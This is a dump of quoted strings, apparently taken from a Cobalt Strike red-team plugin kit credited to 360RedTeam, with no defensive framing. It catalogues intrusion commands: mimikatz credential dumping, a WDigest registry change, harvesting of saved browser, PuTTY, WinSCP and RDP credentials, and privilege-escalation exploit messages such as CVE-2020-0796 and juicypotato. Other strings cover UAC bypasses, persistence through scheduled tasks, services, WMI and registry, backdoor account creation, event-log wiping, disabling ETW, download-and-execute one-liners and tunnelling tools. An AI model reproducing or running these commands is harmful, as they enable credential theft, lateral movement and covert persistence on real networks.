"""			      v0.6beta       By. Xiangshan@360RedTeam "
"""[+] Traversing ActiveProcessLinks list"
"""[+] Trying to trigger arbitrary 'Or'.."
"""[+] Worker  : $('{0:X}' -f $WorkerBitmap.BitmapKernelObj)"
"""[+] _EPROCESS list entry: 0x$("
"""[+]File:"
"""[+]Path:"
"""[>] Building SYSTEM impersonation token"
"""[>] Duplicating CreateProcessWithLogonW handles.."
"""[>] Starting process race"
"""[>] Starting token race"
"""[>] Wiping current impersonation token"
"""[?] Adjacent large session pool feng shui.."
"""[?] Done, got $($ThreadArray.length) thread handle(s)!"
"""[?] Success, open SYSTEM token handle: $SysTokenHandle"
"""[?] Target is Win 10"
"""[?] Target is Win 7"
"""[?] Target is Win 8"
"""[?] Target is Win 8.1"
"""[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($Thread))).ProcessName)"
"""\ \        / /  \/  |_   _| | |  | |   /\   / ____| |/ /  ____|  __ \ "
"""\"
"""\$PuTTYPathEnding"
"""\$RDPPathEnding"
"""\$WinSCPPathEnding"
"""\*"
"""\AppData\Roaming\FileZilla\sitemanager.xml"
"""\Documents\SuperPuTTY\Sessions.xml"
"""\FileZilla.csv"
"""\IPC$"
"""\Microsoft rdp Files.csv"
"""\NTUSER.DAT"
"""\PuTTY ppk Files.csv"
"""\PuTTY.csv"
"""\RDP.csv"
"""\RSA sdtid Files.csv"
"""\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"
"""\SOFTWARE\Microsoft\Terminal Server Client\Servers"
"""\SOFTWARE\SimonTatham\PuTTY\Sessions"
"""\Software\Martin Prikryl\WinSCP 2\Configuration\Security"
"""\Software\Microsoft\Terminal Server Client\Servers\"
"""\SuperPuTTY.csv"
"""\WinSCP.csv"
"""\\"
"""\\Software\\Microsoft\\Windows\\CurrentVersion\\"
"""\\\\.\\pipe\\"
"""\\pipe\\spoolss"
"""\n"
"""\nMachineGuid"
"""\root\default:StdRegProv"
"""\t"
"""]  = "
"""] , $3["
"""] contains: binfo($bid, "
"""] eq "
"""], "
"""], $script, "
"""], %options["
"""_.evtx"
"""__          ____  __ _____   _    _          _____ _  ________ _____  "
"""__EventFilter"
"""__FilterToConsumerBinding"
"""__ProviderArchitecture"
"""__RequiredArchitecture"
"""_pipe\"
"""`n[!] Buffer contains invalid data, quitting..`n"
"""`n[!] Bug did not trigger, try again or patched?`n"
"""`n[!] Duplicating SYSTEM token!`n"
"""`n[!] Holy handle leak Batman, we have a SYSTEM shell!!`n"
"""`n[!] Success, spawning a system shell!"
"""`n[!] Target architecture is x64 only!`n"
"""`n[*] Sniffing out SYSTEM shell.."
"""`n[*] Sniffing out privileged impersonation token.."
"""`n[>] Choosen name : $npipeName"
"""`n[>] Duplicating SYSTEM token"
"""`n[>] Leaking SYSTEM _EPROCESS.."
"""`n[>] Leaking current _EPROCESS.."
"""`n[>] Spawn child"
"""`n[?] Creating Window objects"
"""`n[?] Operating system core count: $([System.Environment]::ProcessorCount)"
"""`n[?] Success, reading beyond worker bitmap size!"
"""`n[?] Thread handle list:"
"""`n[?] Trying thread handle: $Thread"
"""a"
"""action=BackdoorLNK command=\"
"""action=CreateService servicename=$3['servicename'] command=\"
"""action=NewLNK filepath=\"
"""action=WMIEventSub command=\"
"""action=create keyvalue="
"""action=delete"
"""admin"
"""admin$"
"""admin@123"
"""admin@123."
"""administrative session:[a-z]:(.*)"
"""administrator"
"""administrators"
"""advapi32.dll"
"""all -full"
"""all but last fragment of exploit packet"
"""all"
"""arg1 arg2"
"""args"
"""args:  "
"""args:"
"""arguments"
"""arguments:  "
"""arrData=ReadBinary("
"""attime"
"""attime:  "
"""attrib +h +s $1"
"""attrib -h -s $1"
"""automatic"
"""aux"
"""aws"
"""azure"
"""b64_content = Base64Encode(content, false)"
"""beacon"
"""beacons.task"
"""bid"
"""bin.base64"
"""blocketw"
"""bob.smith"
"""bookmarks"
"""brief"
"""browsers"
"""build"
"""bypassuac"
"""byte"
"""c:/"
"""c:\\123.txt"
"""c:\\Windows\\system32\\cmd.exe"
"""c:\\calc"
"""c:\\windows\\Temp\\123.txt"
"""c:\\windows\\system32\\calc.exe"
"""c:\\windows\\system32\\cmd.exe /c calc"
"""c:\\windows\\system32\\werfault.exe"
"""c:\\windows\\temp"
"""c:\\windows\\temp\\123.txt"
"""c:\\windows\\temp\\123.zip"
"""c:\\windows\\temp\\nc.exe"
"""c:\\windows\\temp\\payload.exe"
"""c:\\www\\html"
"""c:\windows\system32\cmd.exe /c "
"""c:\windows\system32\cmd.exe"
"""can't send after socket shutdowncrypto/aes: input not full blockend outside usable address spacemheap.allocSpan called with no Pnon-Go code disabled sigaltstacknumerical argument out of domainpanic while printing panic valuereflect.nameFrom: tag too long: reflect: NumIn of non-func type reflect: NumOut of non-func typeremovespecial on invalid pointerresource temporarily unavailableruntime: mcall function returnedruntime: newstack called from g=runtime: root level max pages = runtime: stack split at bad timeruntime: sudog with non-nil elemruntime: sudog with non-nil nextruntime: sudog with non-nil prevscanstack: goroutine not stoppedslice bounds out of range [%x::]slice bounds out of range [:%x:]slice bounds out of range [::%x]software caused connection abortsweep increased allocation countuse of closed network connection of method on nil interface value142108547152020037174224853515625710542735760100185871124267578125GODEBUG: no value specified for "
"""chats"
"""check"
"""chfs.exe --port= $+ $port --path=\"
"""chrome"
"""cmd /c start \"
"""cmd"
"""cmd.exe"
"""cmd:  "
"""cmd: "
"""cmdpath"
"""cmdpath:  "
"""command"
"""command:  "
"""command: "
"""computer"
"""computerdefaults"
"""computername"
"""computername/*dc*/All"
"""computername:  "
"""content"
"""content:  "
"""content:"
"""content= ts.readall"
"""continue"
"""cookies"
"""copy"
"""crack"
"""crack.exe -i  $+ $Name -p  $+ $port -U  $+ $username -P  $+ $password -s  $+ $type -t  $+ $thread"
"""credit_cards"
"""cscript WMIHACKER.vbs /cmd  $+ $host  $+ $user  $+ \"
"""cscript WMIHACKER.vbs /download  $+ $host  $+ $user  $+ \"
"""cscript WMIHACKER.vbs /upload  $+ $host  $+ $user  $+ \"
"""cve-2016-7255"
"""cve-2020-0796 exploit is x64 only"
"""cve-2020-0796"
"""cve_2020_0796_exploit"
"""daily"
"""databases"
"""dazzleUP"
"""dc123.com"
"""del /f /s /q $3['filename']"
"""del /f /s /q 360bowser.exe"
"""del /f /s /q ATPMiniDump.exe"
"""del /f /s /q chfs.exe"
"""del /f /s /q crack.exe"
"""del /f /s /q frpc.exe"
"""del /f /s /q hack-browser-data.exe"
"""del /f /s /q iox.exe"
"""del /f /s /q lazagne.exe"
"""del /f /s /q npc.exe"
"""del /f /s /q scrying.exe"
"""delete"
"""dikcleanup"
"""dir %APPDATA%\\Microsoft\\Windows\\Recent"
"""dir \\\\.\\pipe\\\\ | findstr \"
"""dll"
"""domain admins\"
"""domain computers\"
"""domain"
"""domain:  "
"""domain_accounts"
"""domain_computer"
"""domain_computers"
"""domain_dcadministrators"
"""domain_dcdc"
"""domain_dcgroup"
"""domain_dcldap"
"""domain_dcname"
"""domain_dcuser"
"""domain_dcuserwmi"
"""domain_group"
"""domain_online"
"""domain_sid"
"""domain_time"
"""domain_trusts"
"""domain_user"
"""domain_workstation"
"""domainadmin"
"""doskey /history"
"""downPath"
"""download"
"""eb_trans2_buffer"
"""eb_trans2_exploit"
"""eb_trans2_zero"
"""edge"
"""enable"
"""encrypt $3['path'] $3['pass']"
"""end function"
"""eventname"
"""eventname:  "
"""eventvwr"
"""exec"
"""exit"
"""explorer.exe"
"""favorite3.dat"
"""file"
"""file:  "
"""filename list or password"
"""filename list or username"
"""filename"
"""filename:  "
"""filename:"
"""filepath"
"""filepath:  "
"""findstr /s /i \"
"""firefox"
"""firewall"
"""fodhelper"
"""frpc.exe -t  $+ $Name -p  $+ $port"
"""fscan.exe -h 192.168.1.1/24 -o out.txt"
"""full address:[a-z]:(.*)"
"""function StrToBytes(ByVal sText, ByVal sTextEncoding, ByVal iBomByteCount)"
"""gSharedInfo"
"""games"
"""gatewayhostname:[a-z]:(.*)"
"""gc"
"""gcloud"
"""gdi32.dll"
"""gethtml"
"""getsystem"
"""git"
"""group"
"""group:  "
"""groupname"
"""groupname/*admin*/All"
"""groupname:  "
"""groups"
"""groups:  "
"""groups: "
"""hack-browser-data.exe"
"""hash"
"""hex"
"""hex: "
"""history"
"""host"
"""host/ip:  "
"""host:  "
"""host: "
"""hostname or IP address"
"""hostname"
"""hostname: "
"""hotfixid"
"""hourly"
"""http://127.0.0.1"
"""https://baidu.com"
"""https://download.microsoft.com/download/E/2/1/E21644B5-2DF2-47C2-91BD-63C560427900/NDP452-KB2901907-x86-x64-AllOS-ENU.exe"
"""https://github.com/pandasec888"
"""iex(New-Object Net.WebClient).DownloadString('http://google.com')"
"""inject"
"""install /command:"
"""install /url:"
"""internal"
"""iox.exe fwd -r  $+ $lhost -r  $+ $rhost -k  $+ $hex"
"""ip"
"""ip:  "
"""ip: "
"""ips"
"""iptype"
"""juicypotato"
"""juicypotato(ms16-075)"
"""kernel32"
"""kernel32.dll"
"""lazagne"
"""lazagne.exe $arg"
"""lhost"
"""lhost: "
"""lhost:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565 rhost:./iox fwd -l *8888 -l 33890 -k 656565"
"""listener"
"""listlog"
"""lnkicon"
"""lnkicon:  "
"""lnkname"
"""lnkname:  "
"""lnkpath"
"""lnkpath:  "
"""lnktarget"
"""lnktarget:  "
"""localfile: "
"""localpath"
"""localpath: "
"""logins"
"""logon"
"""mails"
"""maven"
"""memory"
"""meter"
"""microsoft.com"
"""mimikatz"
"""mimikatz: DPAPI Master Key SHA1"
"""mimikatz: DPAPI Master Key"
"""mimikatz: DPAPI"
"""mimikatz: SHA1"
"""misc -full"
"""modifytime"
"""modules/Intranet penetration.cna"
"""modules/Intranet.cna"
"""modules/Lateral movement.cna"
"""modules/RdpThief.cna"
"""modules/SharpDPAPI.cna"
"""modules/about.cna"
"""modules/brute force.cna"
"""modules/credential access.cna"
"""modules/discovery.cna"
"""modules/entertainment.cna"
"""modules/privilege escalation.cna"
"""modules/privilege.cna"
"""modules/system.cna"
"""ms14-058"
"""ms15-051"
"""ms16-016 exploit is x86 only"
"""ms16-016"
"""msg $username \"
"""mstsc.exe"
"""multimedia"
"""mysql"
"""name = 'eventlog'"
"""name"
"""name:  "
"""nc -l -p 8888"
"""nc"
"""nc:nc shell###shell:MSF shell###meter:MSF meter shell"
"""net accounts /domain"
"""net config workstation"
"""net group /domain"
"""net group \"
"""net localgroup administrators /domain"
"""net statistics workstation"
"""net time /domain"
"""net user $1 /domain"
"""net user $Name $Pwd /add  && net localgroup $groups $Name /add"
"""net user /domain"
"""net user guest /active:yes"
"""net view /domain"
"""net view /domain:$1"
"""net view"
"""netdom query pdc"
"""netsh advfirewall firewall add rule name=\"
"""netsh firewall show config"
"""netsh wlan show networks mode=bssid"
"""netsh wlan show profile name=\"
"""netsh wlan show profiles"
"""nltest /DCLIST:$1"
"""nltest /domain_trusts"
"""npc.exe -server= $+ $server -vkey= $+ $vkey"
"""ntdll.dll"
"""objRegistry.CreateKey 2147483650, "
"""objRegistry.GetBinaryValue 2147483650,"
"""or run \"
"""outfile"
"""outfile:  "
"""outpath"
"""outpath:  "
"""outpath: "
"""part1"
"""pass"
"""pass.txt: "
"""pass:  "
"""pass: "
"""passwd"
"""passwd:  "
"""password"
"""password:  "
"""password: "
"""path"
"""path:  "
"""path="
"""payload"
"""payload.exe||passwords*||*.txt"
"""payload:  "
"""permission"
"""php"
"""ping"
"""port"
"""port:  "
"""port: "
"""ports"
"""ports:  "
"""powerpick certutil.exe -urlcache -split -f "
"""powershell"
"""powershell.exe -nop -w hidden -c \"
"""process"
"""processid"
"""prompt for credentials:[a-z]:(.*)"
"""psexec"
"""pth"
"""query user || qwinsta"
"""qwinsta"
"""r"
"""raw"
"""read"
"""recent_ladon"
"""recenttest"
"""reg add  $+ $Prefix /f"
"""reg add  $+ $Prefix /v Debugger /t REG_SZ /d \"
"""reg add  $+ $Reg /f"
"""reg add  $+ $Reg /v Svchost /t REG_SZ /d \"
"""reg add  $+ $Reg /v Userinit /t REG_SZ /d \"
"""reg add  \"
"""reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f"
"""reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f"
"""reg add \"
"""reg load"
"""reg unload"
"""regInfo.Author = "
"""regInfo.Description = "
"""remotepath"
"""remotepath: "
"""retcode = objRegistry.SetBinaryValue(2147483650, "
"""rhost"
"""rhost: "
"""root/cimv2"
"""root\cimv2"
"""root\default"
"""root\subscription"
"""route print"
"""route_print"
"""rundll32.exe user32.dll,LockWorkStation"
"""rw"
"""s"
"""sc config \"
"""sc create \"
"""schtask name:  "
"""schtask time:"
"""schtask_name"
"""schtask_time"
"""schtaskbackdoor"
"""schtasks /query /fo LIST /v"
"""schtasks"
"""schtasks.exe"
"""schtasks_description"
"""schtasks_description:  "
"""schtasks_exe"
"""schtasks_name"
"""schtasks_name:  "
"""script"
"""script/RdpThief_x64.tmp"
"""scripting.filesystemobject"
"""scrying.exe -f  $+ $targets"
"""sdclt"
"""sdtid Files"
"""sekurlsa::backupkeys"
"""sekurlsa::credman"
"""sekurlsa::dpapi"
"""sekurlsa::dpapi\ndpapi::cache\nstandard::sleep 111"
"""sekurlsa::dpapi\ndpapi::cache\nstandard::sleep 112"
"""sekurlsa::ekeys"
"""sekurlsa::kerberos"
"""sekurlsa::livessp"
"""sekurlsa::logonpasswords"
"""sekurlsa::msv"
"""sekurlsa::ssp"
"""sekurlsa::tickets"
"""sekurlsa::trust"
"""sekurlsa::tspkg"
"""sekurlsa::wdigest"
"""server"
"""server: "
"""service name:  "
"""service"
"""service:  "
"""service_name"
"""servicename"
"""servicename:  "
"""sessionpath"
"""sessionpath:  "
"""set COMPlus_ETWEnabled=0"
"""set fs = createobject("
"""set ts = fs.opentextfile("
"""set ws=createobject("
"""settings.DisallowStartIfOnBatteries = False"
"""settings.Enabled = True"
"""settings.Hidden = False"
"""settings.StartWhenAvailable = True"
"""shares"
"""sharpDPAPI -dump"
"""sharpDPAPI"
"""sharpDPAPI_masterkeysToClipboard"
"""sharpchrome"
"""sharptask"
"""sharpwmi"
"""sheetname"
"""sheetname:  "
"""sheets"
"""shell"
"""shutdown -r -t 0"
"""shutdown -s -t 0"
"""sid"
"""sid:  "
"""single command mode"
"""slui"
"""smb"
"""socket error, exploit may fail "
"""socket error, exploit may fail horribly"
"""spawn"
"""spoolsystem "
"""spoolsystem"
"""spooltrigger"
"""ssh"
"""start"
"""startup"
"""svn"
"""sysadmin"
"""system -full"
"""systeminfo"
"""target"
"""target:  "
"""targets"
"""targets.txt"
"""targets.txt: "
"""targets: "
"""taskkill -f /im $3['filename']"
"""taskkill -f /im chfs.exe"
"""taskkill -f /im crack.exe"
"""taskkill -f /im frpc.exe"
"""taskkill -f /im fscan.exe & del /f /s /q fscan.exe & del /f /s /q out.txt"
"""taskkill -f /im iox.exe"
"""taskkill -f /im lazagne.exe"
"""taskkill -f /im modify.exe"
"""taskkill -f /im npc.exe"
"""taskkill -f /im scrying.exe"
"""test"
"""testservice"
"""the command to run on remote host"
"""thread"
"""thread:  "
"""thread: "
"""time"
"""time:  "
"""triage "
"""true"
"""ts.close"
"""type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
"""type %temp%\\data.bin"
"""type"
"""type:  "
"""type: "
"""type:"
"""uarchhistory3.db"
"""uhistory3.db"
"""ui0rkJ7dIzf2ahlxNbZP/1sf3sHMniDIDMj_xY900/C_wB21yl-bT3gKG7GFYz/yL6jG0qLbKWzEMWyzYXw"
"""update"
"""upload"
"""uri"
"""url"
"""url:  "
"""urn:schemas-microsoft-com:asm.v3"
"""user -full"
"""user"
"""user.txt: "
"""user32.dll"
"""user:  "
"""user: "
"""username"
"""username/*admin*/All"
"""username:  "
"""username: "
"""utf-16le"
"""utf-8"
"""val=ws.regwrite(path&"
"""vault::cred /patch"
"""vbscript"
"""view_domain"
"""vkey"
"""vkey: "
"""wbemscripting.swbemlocator"
"""wevtutil cl \"
"""wget"
"""whoami /all"
"""whoami"
"""whoami\"
"""wifi"
"""win7.sun.com"
"""win7/win7.sun.com"
"""windows"
"""winmgmts:{impersonationLevel=impersonate}!\\"
"""wmi"
"""wmi.txt"
"""wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] PATH win32_terminalservicesetting WHERE (__Class!=\"
"""wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] RDTOGGLE WHERE ServerName=\'$3['hostname']\' call SetAllowTSConnections 0"
"""wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] RDTOGGLE WHERE ServerName=\'$3['hostname']\' call SetAllowTSConnections 1"
"""wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] process call create \'cmd.exe /c REG ADD \"
"""wmic /node:$3['ip'] /user:$3['user'] /password:$3['pass'] process call create \'cmd.exe /c netsh advfirewall firewall add rule name=\"
"""wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0"
"""wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1"
"""wmic process get caption,commandline,processid /value"
"""wmic process get caption,executablepath,commandline"
"""wmic product get name,version"
"""wmic qfe get Caption,Description,HotFixID,InstalledOn"
"""wmic service list brief"
"""wmic share get name,path"
"""wmic startup get command,caption"
"""wmic useraccount get /all"
"""workstation"
"""wql"
"""wscript.shell"
"""x64"
"""x64.dll"
"""x64: "
"""x86"
"""x86.dll"
"""xp"
"""{0:X}"
"""{0}"
"""| measure"
